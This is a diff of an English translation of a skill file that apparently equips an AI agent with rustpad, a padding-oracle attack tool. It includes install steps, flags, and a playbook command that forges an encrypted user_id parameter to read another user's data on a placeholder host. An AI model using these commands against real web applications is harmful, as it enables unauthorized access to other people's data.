@@ -2,38 +2,42 @@
 name: rustpad-oracle-gui
 description: "rustpad: Forges encrypted parameters for horizontal privilege escalation. Signals: cryptographic attack, encryption cracking, decryption mode, forged ciphertext mode, injection point marking."
 zh-signals: "rustpad: 加密参数伪造(水平越权)。信号:密码学攻击,加密破解,解密模式,伪造密文模式,注入点标记。"
+when-to-use: >-
+  Use when a web application exposes encrypted parameters and you suspect a
+  padding oracle, to interactively decrypt or forge ciphertext for horizontal
+  privilege escalation; requires the target URL and cipher block size.
 ---
 
 # rustpad
 
-- 攻击大类:C49 密码误用与协议分析
-- 上游仓库:https://github.com/Kibouo/rustpad
-- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C49 Cryptographic Misuse and Protocol Analysis
+- Upstream Repository: https://github.com/Kibouo/rustpad
+- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 cargo install rustpad
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `rustpad --url 'https://t.com/?id=xxx' --block-size 16` | 交互式 padding oracle |
-| `--decrypt` | 解密模式 |
-| `--encrypt` | 伪造密文模式 |
-| `--query 'id=FUZZ'` | 注入点标记 |
+| `rustpad --url 'https://t.com/?id=xxx' --block-size 16` | Interactive padding oracle |
+| `--decrypt` | Decryption mode |
+| `--encrypt` | Forged ciphertext mode |
+| `--query 'id=FUZZ'` | Injection point marking |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 加密参数伪造(水平越权)
+### Forging encrypted parameters (horizontal privilege escalation)
 
 ```bash
 rustpad --url 'https://t.com/view?doc=IVCIPHER' --block-size 16 --encrypt
-# 改 user_id 密文,越权看他人数据
+# Modify the user_id ciphertext to access another user's data
 ```
 
-## 注意事项
+## Notes
 
-交互式 TUI padding oracle 工具,支持加密模式——伪造任意明文密文,比只解密的工具多一半能力。
+Interactive TUI padding oracle tool with an encryption mode, forging arbitrary plaintext ciphertexts, which gives it far more capability than decrypt-only tools.
